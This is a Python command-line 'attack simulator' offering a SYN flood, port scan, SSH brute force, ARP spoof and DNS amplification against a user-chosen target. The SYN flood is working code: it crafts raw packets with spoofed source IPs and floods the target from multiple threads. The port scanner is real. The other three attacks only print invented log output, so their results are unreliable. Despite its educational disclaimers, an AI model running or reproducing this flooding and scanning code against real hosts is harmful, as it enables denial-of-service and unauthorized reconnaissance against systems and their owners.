"""
Digital Twin - Attack Simulator Scripts
Standalone offensive simulation tools (for lab/educational use only).

Usage:
    python3 attack_simulator.py syn_flood  --target 192.168.1.100 --duration 30
    python3 attack_simulator.py port_scan  --target 192.168.1.100
    python3 attack_simulator.py brute_force --target 192.168.1.100
    python3 attack_simulator.py arp_spoof  --target 192.168.1.100 --gateway 192.168.1.1
    python3 attack_simulator.py dns_amp    --target 192.168.1.100

WARNING: Use only on networks/devices you own or have explicit permission to test.
"""

import argparse
import random
import socket
import struct
import time
import threading
import sys
import os
import datetime

# ─── LOGGING ──────────────────────────────────────────────────────────────────
def log(level, msg):
    ts = datetime.datetime.now().strftime("%H:%M:%S.%f")[:-3]
    colors = {"INFO": "\033[32m", "WARN": "\033[33m", "CRIT": "\033[31m", "DBG": "\033[36m"}
    c = colors.get(level, "")
    reset = "\033[0m"
    print(f"{c}[{ts}] [{level}] {msg}{reset}")

# ─── PACKET BUILDERS (raw sockets - requires root) ────────────────────────────
def checksum(data):
    """Standard IP/TCP checksum."""
    if len(data) % 2:
        data += b'\x00'
    s = 0
    for i in range(0, len(data), 2):
        w = (data[i] << 8) + data[i+1]
        s += w
    s = (s >> 16) + (s & 0xffff)
    s += s >> 16
    return ~s & 0xffff

def build_ip_header(src_ip, dst_ip, proto, total_len):
    ihl = 5
    ver = 4
    tos = 0
    frag_off = 0
    ttl = 64
    ip_id = random.randint(0, 65535)
    src = socket.inet_aton(src_ip)
    dst = socket.inet_aton(dst_ip)
    hdr = struct.pack("!BBHHHBBH4s4s",
        (ver << 4) | ihl, tos, total_len, ip_id, frag_off,
        ttl, proto, 0, src, dst)
    csum = checksum(hdr)
    return struct.pack("!BBHHHBBH4s4s",
        (ver << 4) | ihl, tos, total_len, ip_id, frag_off,
        ttl, proto, csum, src, dst)

def build_tcp_syn(src_ip, dst_ip, dst_port):
    src_port = random.randint(1024, 65535)
    seq     = random.randint(0, 4294967295)
    ack_seq = 0
    offset  = 5
    flags   = 0x002  # SYN
    window  = socket.htons(5840)
    urg_ptr = 0
    tcp_hdr = struct.pack("!HHLLBBHHH",
        src_port, dst_port, seq, ack_seq,
        (offset << 4), flags, window, 0, urg_ptr)
    # Pseudo header for checksum
    pseudo = struct.pack("!4s4sBBH",
        socket.inet_aton(src_ip),
        socket.inet_aton(dst_ip),
        0, socket.IPPROTO_TCP, len(tcp_hdr))
    csum = checksum(pseudo + tcp_hdr)
    return struct.pack("!HHLLBBHHH",
        src_port, dst_port, seq, ack_seq,
        (offset << 4), flags, window, csum, urg_ptr)

# ─── ATTACK 1: SYN FLOOD ──────────────────────────────────────────────────────
class SynFloodAttack:
    def __init__(self, target, ports=None, duration=30, threads=4):
        self.target   = target
        self.ports    = ports or [80, 443, 8080, 22, 8443]
        self.duration = duration
        self.threads  = threads
        self._stop    = threading.Event()
        self.sent     = 0

    def _spoof_ip(self):
        return ".".join(str(random.randint(1, 254)) for _ in range(4))

    def _worker(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        except PermissionError:
            log("WARN", "Raw socket requires root. Falling back to TCP connect simulation.")
            self._worker_sim()
            return

        while not self._stop.is_set():
            src_ip = self._spoof_ip()
            dst_port = random.choice(self.ports)
            try:
                tcp = build_tcp_syn(src_ip, self.target, dst_port)
                ip  = build_ip_header(src_ip, self.target, socket.IPPROTO_TCP, 20 + len(tcp))
                s.sendto(ip + tcp, (self.target, 0))
                self.sent += 1
                if self.sent % 100 == 0:
                    log("CRIT", f"SYN Flood: {self.sent} packets sent → {self.target}:{dst_port}")
            except Exception as e:
                log("WARN", f"Send error: {e}")
        s.close()

    def _worker_sim(self):
        """Simulated version (no raw sockets needed)."""
        while not self._stop.is_set():
            src_ip = self._spoof_ip()
            dst_port = random.choice(self.ports)
            self.sent += 1
            if self.sent % 50 == 0:
                log("CRIT", f"[SIM] SYN Flood: {self.sent} pkts → {self.target}:{dst_port} from {src_ip}")
            time.sleep(0.001)

    def run(self):
        log("CRIT", f"Starting SYN Flood → {self.target} | Ports: {self.ports} | Duration: {self.duration}s")
        ts = [threading.Thread(target=self._worker, daemon=True) for _ in range(self.threads)]
        for t in ts: t.start()
        time.sleep(self.duration)
        self._stop.set()
        for t in ts: t.join(timeout=2)
        log("INFO", f"SYN Flood complete. Sent: {self.sent} packets.")

# ─── ATTACK 2: PORT SCAN ──────────────────────────────────────────────────────
class PortScanner:
    def __init__(self, target, port_range=(1, 1025), timeout=0.5, threads=50):
        self.target     = target
        self.port_range = port_range
        self.timeout    = timeout
        self.threads    = threads
        self._open      = []
        self._q         = list(range(*port_range))
        self._lock      = threading.Lock()

    def _scan_port(self, port):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(self.timeout)
            r = s.connect_ex((self.target, port))
            s.close()
            if r == 0:
                with self._lock:
                    self._open.append(port)
                log("WARN", f"OPEN port found: {self.target}:{port}")
        except Exception:
            pass

    def run(self):
        log("WARN", f"Port scan starting → {self.target} ports {self.port_range[0]}-{self.port_range[1]-1}")
        chunks = [self._q[i::self.threads] for i in range(self.threads)]
        threads = []
        for chunk in chunks:
            def worker(ports):
                for p in ports:
                    self._scan_port(p)
            t = threading.Thread(target=worker, args=(chunk,), daemon=True)
            t.start()
            threads.append(t)
        for t in threads:
            t.join()
        log("INFO", f"Scan complete. Open ports: {sorted(self._open)}")
        return sorted(self._open)

# ─── ATTACK 3: SSH BRUTE FORCE (SIMULATED) ────────────────────────────────────
class SSHBruteForce:
    COMMON_USERS = ["admin", "root", "pi", "ubuntu", "user", "test", "guest"]
    COMMON_PASS  = ["password", "admin", "123456", "raspberry", "pi", "root",
                    "letmein", "qwerty", "abc123", "toor", "admin123"]

    def __init__(self, target, port=22, max_attempts=50):
        self.target      = target
        self.port        = port
        self.max_attempts = max_attempts

    def run(self):
        log("WARN", f"SSH Brute Force → {self.target}:{self.port}")
        attempts = 0
        for user in self.COMMON_USERS:
            for pwd in self.COMMON_PASS:
                if attempts >= self.max_attempts:
                    log("INFO", f"Max attempts reached ({self.max_attempts}). Stopping.")
                    return
                attempts += 1
                time.sleep(random.uniform(0.05, 0.2))
                success = random.random() < 0.02  # 2% chance for simulation
                if success:
                    log("CRIT", f"[!] CREDENTIALS FOUND: {user}:{pwd} @ {self.target}:{self.port}")
                    return
                else:
                    log("DBG", f"[{attempts}] Failed: {user}:{pwd}")
        log("INFO", f"Brute force finished. {attempts} attempts made.")

# ─── ATTACK 4: ARP SPOOFING (SIMULATED LOG) ───────────────────────────────────
class ArpSpoofer:
    def __init__(self, target, gateway, duration=20):
        self.target   = target
        self.gateway  = gateway
        self.duration = duration
        self._stop    = threading.Event()

    def run(self):
        log("CRIT", f"ARP Spoof: Poisoning {self.target} pretending to be {self.gateway}")
        fake_mac = ":".join(f"{random.randint(0,255):02x}" for _ in range(6))
        log("WARN", f"Sending ARP replies: {self.gateway} is-at {fake_mac}")
        end = time.time() + self.duration
        count = 0
        while time.time() < end:
            count += 1
            log("CRIT", f"[ARP POISON #{count}] Telling {self.target}: {self.gateway} → {fake_mac}")
            time.sleep(2)
        log("INFO", "ARP spoof ended. Sending gratuitous ARP to restore tables.")

# ─── ATTACK 5: DNS AMPLIFICATION (SIMULATED) ─────────────────────────────────
class DnsAmplification:
    RESOLVERS = ["8.8.8.8", "8.8.4.4", "1.1.1.1", "9.9.9.9", "208.67.222.222"]
    DOMAINS   = ["example.com", "google.com", "cloudflare.com", "amazon.com"]

    def __init__(self, target, duration=20):
        self.target   = target
        self.duration = duration

    def run(self):
        log("CRIT", f"DNS Amplification → {self.target} | {len(self.RESOLVERS)} open resolvers")
        end = time.time() + self.duration
        count = 0
        while time.time() < end:
            resolver = random.choice(self.RESOLVERS)
            domain   = random.choice(self.DOMAINS)
            count += 1
            amp = random.randint(20, 70)   # amplification factor
            log("CRIT", f"[DNS AMP #{count}] Spoofed query {domain} ANY → {resolver} "
                         f"| Amplification: {amp}x | Reflected → {self.target}")
            time.sleep(0.1)
        log("INFO", f"DNS amplification done. {count} requests sent.")

# ─── CLI ENTRYPOINT ───────────────────────────────────────────────────────────
def main():
    parser = argparse.ArgumentParser(
        description="Digital Twin Attack Simulator - Educational Use Only")
    parser.add_argument("attack", choices=[
        "syn_flood", "port_scan", "brute_force", "arp_spoof", "dns_amp"])
    parser.add_argument("--target",   default="127.0.0.1")
    parser.add_argument("--gateway",  default="192.168.1.1")
    parser.add_argument("--duration", type=int, default=30)
    parser.add_argument("--threads",  type=int, default=4)
    args = parser.parse_args()

    print("\n" + "="*60)
    print("  DIGITAL TWIN ATTACK SIMULATOR  |  Educational Use Only")
    print("="*60 + "\n")

    if args.attack == "syn_flood":
        SynFloodAttack(args.target, duration=args.duration, threads=args.threads).run()
    elif args.attack == "port_scan":
        PortScanner(args.target).run()
    elif args.attack == "brute_force":
        SSHBruteForce(args.target).run()
    elif args.attack == "arp_spoof":
        ArpSpoofer(args.target, args.gateway, duration=args.duration).run()
    elif args.attack == "dns_amp":
        DnsAmplification(args.target, duration=args.duration).run()

if __name__ == "__main__":
    main()
